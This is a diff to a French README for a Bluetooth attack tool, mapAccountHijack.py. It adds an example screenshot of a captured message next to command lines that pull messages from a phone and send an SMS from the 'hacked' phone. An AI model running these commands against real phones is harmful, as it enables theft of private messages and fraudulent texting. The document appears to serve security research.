@@ -247,6 +247,9 @@ On peut voir les options avec :
 On peut récupérer les messages d'un téléphone avec la commande :
 `python3 mapAccountHijack.py --address <MAC_bluetooth> --dest-dir ./out`
 
+Exemple de message capturé : 
+<img width="1113" height="389" alt="message_sniff" src="https://github.com/user-attachments/assets/2478b2aa-cf89-427e-b37d-4b9aab262dc0" />
+
 On peut à la fois récupérer les messages et envoyer un SMS avec le téléphone piraté : 
 `python3 mapAccountHijack.py --address <MAC_bluetooth> --dest-dir ./out --phone-number <Num_Tel>`
 
